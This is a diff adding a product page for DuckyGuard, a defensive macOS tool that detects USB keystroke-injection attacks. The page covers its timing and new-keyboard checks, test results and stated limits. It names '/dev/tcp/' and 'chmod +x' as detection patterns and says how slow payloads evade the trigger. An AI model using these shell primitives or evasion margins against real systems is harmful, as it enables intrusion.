+      <p class="verdict" id="verdict" aria-live="polite">Pick a replay, or type in the box below. The score needs 12 keys before it can judge.</p>
+      <div class="typebox">
+        <label for="tb">Or type here and see how your own rhythm scores</label>
+        <textarea id="tb" spellcheck="false" autocomplete="off" placeholder="Type normally, then try mashing keys."></textarea>
+      </div>
+      <p class="note">The real app adds two signals a browser can't see: whether a new keyboard was plugged in within the last 5 to 15 seconds, and command patterns such as <code>chmod +x</code> or <code>/dev/tcp/</code>.</p>
+    </div>
+  </div>
+</div></section>
+
+<section class="s" id="how"><div class="wrap">
+  <h2>Four steps, all on your Mac.</h2>
+  <p class="sub">What the current code does, in plain terms.</p>
+  <div class="grid two">
+    <div class="card"><p class="n">01 · Timing check</p><h3>Too fast, too even</h3><p>Every keystroke goes into a rolling window of the last 12. DuckyGuard scores speed (over 20 keys a second is suspicious) and how evenly spaced the keys are (people vary; firmware loops barely do). A combined score of 0.70 or more triggers.</p></div>
+    <div class="card"><p class="n">02 · New keyboard check</p><h3>Plugged in, then typing at once</h3><p>Once a second it checks the Mac's list of keyboards and other input devices. A new one that starts typing within 5 seconds adds to the score, and known injector chips (Flipper Zero, Raspberry Pi Pico, Teensy-class boards) are named in the report.</p></div>
+    <div class="card"><p class="n">03 · Focus pull</p><h3>Takes the keys away from your terminal</h3><p>On a trigger it shows a macOS alert and brings DuckyGuard's window to the front, so the rest of the burst lands there instead of in Terminal. Those keys are written to a local capture file until the burst stops.</p></div>
+    <div class="card"><p class="n">04 · Incident report</p><h3>What it tried, in a format your tools read</h3><p>The capture becomes a Markdown report: URLs and IP addresses pulled out, base64 decoded, MITRE ATT&amp;CK techniques listed (T1200, T1059, T1105 and more), plus a YARA rule you can drop into your scanners.</p></div>
+  </div>
+</div></section>
+
+<section class="s" id="proof"><div class="wrap">
+  <h2>Measured on synthetic input, so far.</h2>
+  <p class="sub">The repository's tests pass (3 of 3). These results come from feeding timed keystrokes into the detector with the app's settings. A recorded run against a physical Rubber Ducky or Flipper Zero isn't published yet; when it is, it goes here.</p>
+  <div class="tblwrap"><table class="tbl">
+    <thead><tr><th scope="col">Input</th><th scope="col">Result</th></tr></thead>
+    <tbody>
+      <tr><td>Even burst, 8 ms per key (125 keys/s)</td><td>Flagged at key 12</td></tr>
+      <tr><td>Even burst, 12 ms per key (83 keys/s)</td><td>Flagged at key 12</td></tr>
+      <tr><td>Even burst, 25 ms per key (40 keys/s)</td><td>Flagged at key 12</td></tr>
+      <tr><td>Even burst, 30 ms per key, no new keyboard, no known command</td><td>Not flagged (0.65)</td></tr>
+      <tr><td>Human-paced typing, 110 to 240 ms per key</td><td>Not flagged</td></tr>
+      <tr><td>Fast uneven key mashing, 30 to 90 ms per key</td><td>Not flagged</td></tr>
+    </tbody>
+  </table></div>
+</div></section>
+
+<section class="s" id="limits"><div class="wrap">
+  <p class="px">Limits</p>
+  <h2>What DuckyGuard does not do.</h2>
+  <p class="sub">A security tool should tell you where it stops. These come from the threat model and from testing the code.</p>
+  <ul class="limits">
+    <li><strong>The first keys get through.</strong> The check needs about 12 keystrokes to judge, and it watches keys rather than blocking them at the system level. Those first keys reach whatever app is open, and a very short payload can finish before focus moves.</li>
+    <li><strong>Slow or human-paced payloads can pass.</strong> An attacker who types under about 30 keys a second with even timing, on a keyboard that wasn't just plugged in, can stay under the trigger. Payloads slowed to human speed take 30 to 60 seconds, which gives you time to notice and unplug.</li>
+    <li><strong>It needs Accessibility permission.</strong> macOS only lets it see keystrokes after you allow it in System Settings → Privacy &amp; Security → Accessibility.</li>
+    <li><strong>It isn't a USB lock.</strong> It does not block devices or ports. Pair it with a locked screen when you step away.</li>
+    <li><strong>macOS only.</strong> No Windows or Linux version.</li>
+  </ul>
+</div></section>
+
+<section class="s" id="free"><div class="wrap">
+  <h2>Free for everyone. All of it.</h2>
+  <p class="sub">No account, no paid tier, no feature held back.</p>
+  <div class="plans">
+    <div class="plan">
+      <span class="chip">$0 · free</span>
+      <h3>What you get</h3>
+      <ul class="feat">
+        <li>Timing check and new-keyboard check</li>
+        <li>Focus pull with a macOS alert</li>
+        <li>Local capture of the intercepted burst</li>
+        <li>Incident report with MITRE ATT&amp;CK techniques and a YARA rule</li>
+        <li>Menu bar icon and a built-in attack simulator for testing</li>
+      </ul>
+      <a class="btn" href="#get" data-dl-plan>Download soon · get notified</a>
+    </div>
+    <div class="plan support" id="support">
+      <span class="chip soon">Optional</span>
+      <h3>Like DuckyGuard? Chip in what you want.</h3>
+      <p class="support-copy">$5 is a nice number. It keeps DuckyGuard free for everyone. Supporting doesn't unlock anything: everyone gets the same app.</p>
+      <a class="btn btn-orange mag" data-support-btn href="mailto:steven@shindustries.co?subject=Supporting%20DuckyGuard&amp;body=I'd%20like%20to%20chip%20in%20for%20DuckyGuard.%20Send%20me%20the%20link%20when%20it's%20up.">Support link coming · email me</a>
+      <p class="note" data-support-note>The pay-what-you-want link isn't live yet. Email and we'll send it once it is.</p>
+    </div>
+  </div>
+</div></section>
+
+<section class="s" id="get"><div class="wrap">
+  <div class="get">
+    <img src="assets/duck-96.png" alt="" width="84" height="96">
+    <div>
+      <h2 data-dl-title>Download coming soon</h2>
+      <p data-dl-copy>The first public build is being packaged. Leave your email and we'll send one note when it's ready to install.</p>
+      <p class="note" data-dl-gk>About macOS Gatekeeper: when the build ships, this page will say whether it is signed and notarized by Apple. If a build isn't notarized, macOS blocks the first launch and you'd approve it in System Settings → Privacy &amp; Security. We plan to ship it notarized.</p>
+      <div class="ctas" style="margin:16px 0 0">
+        <a class="btn btn-orange" data-dl-btn href="mailto:steven@shindustries.co?subject=DuckyGuard%20download&amp;body=Email%20me%20when%20DuckyGuard%20is%20ready%20to%20download.">Email me when it's ready</a>
+      </div>
+    </div>
+  </div>
+  <div class="founder">
+    <p><strong>Built by Steven Hainley</strong>, Cybersecurity (BS) at WPI, for sh. industries.</p>
+    <p>Operating systems trust anything that says it's a keyboard. DuckyGuard is a second opinion on that trust.</p>
+  </div>
+</div></section>
+
+</main>
+
+<footer class="ft"><div class="wrap">
+  <div class="ft-top">
+    <div class="ft-brand">
+      <span class="gt" aria-hidden="true"><svg><use href="#glim"/></svg></span>
+      <p class="ft-tag">Give your business a second brain.</p>
+      <p class="ft-co">sh. industries, Massachusetts. Small software that does the boring part for small businesses. Questions, setup help, anything: <a href="mailto:glim@shindustries.co">glim@shindustries.co</a>, a person reads it.</p>
+    </div>
+    <nav class="ft-cols" aria-label="Site">
+      <div><p class="ft-h">Glim</p><ul>
+        <li><a href="../index.html#explain">Explain Glim</a></li><li><a href="../index.html#trade">Try it with your business</a></li><li><a href="../index.html#beta">Beta, honestly</a></li><li><a href="../index.html#pricing">Pricing</a></li><li><a href="../index.html#install">Install</a></li><li><a href="../index.html#faq">Questions</a></li>
+      </ul></div>
+      <div><p class="ft-h">Products</p><ul>
+        <li><a href="../products.html#glim">Glim<small>Founding beta · $29 a month</small></a></li>
+        <li><a href="../duckyguard/">DuckyGuard<small>Free Mac tool · in development</small></a></li>
+        <li><a href="../products.html">All products</a></li>
+      </ul></div>
+      <div><p class="ft-h">Company</p><ul>
+        <li><a href="../about.html">About sh. industries</a></li>
+        <li><a href="https://stevenhainley.net" rel="noopener">Steven Hainley, founder<small>stevenhainley.net</small></a></li>
+        <li><a href="mailto:glim@shindustries.co">glim@shindustries.co</a></li>
+      </ul></div>
+      <div><p class="ft-h">Legal</p><ul>
+        <li><a href="../privacy.html">Privacy</a></li><li><a href="../terms.html">Terms</a></li><li><a href="../refunds.html">Refunds</a></li><li><a href="../sms.html">Text messaging</a></li>
+      </ul></div>
+    </nav>
+  </div>
+  <div class="ft-bot">
+    <span>© 2026 sh. industries · Massachusetts, USA</span>
+    <span>Made by <a href="https://stevenhainley.net" rel="noopener">Steven Hainley</a></span>
+    <span class="px">No trackers · no cookies</span>
+  </div>
+</div></footer>
+
+<script src="config.js"></script>
+<script src="page.js"></script>
+</body>
+</html>
